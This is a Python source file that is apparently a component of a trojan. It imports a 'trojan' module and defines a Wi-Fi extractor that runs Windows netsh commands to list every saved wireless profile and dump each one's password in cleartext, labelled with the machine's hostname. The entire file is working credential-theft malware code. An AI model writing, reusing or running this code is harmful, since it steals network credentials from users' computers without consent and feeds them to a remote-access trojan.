import subprocess
import re
import trojan as Trojan
from trojan import *

class Wifi_Extractor:

    def wifi_passwords():
        result = ""
        result +=f'Wifi Passwords for {Trojan().get_hostname()} : \n'
        command = "netsh wlan show profile"
        networks = subprocess.check_output(command,shell=True)
        output_str = networks.decode("utf-8")
        network_names_list = re.findall("(?:Profile\s*:\s)(.*)",output_str)
        for networks in network_names_list:
            command = f'netsh wlan show profile "{networks}" key=clear'
            try:
                current_result = subprocess.check_output(command,shell=True)
                output_str = current_result.decode("utf-8")
            except (subprocess.CalledProcessError,UnicodeDecodeError) :
                continue     
            try:
                key_content = re.search(r"Key Content\s+:\s(.+)\r",output_str).group(1)
            except AttributeError:
                continue
            result +=f'{networks} : {key_content} \n'
        return result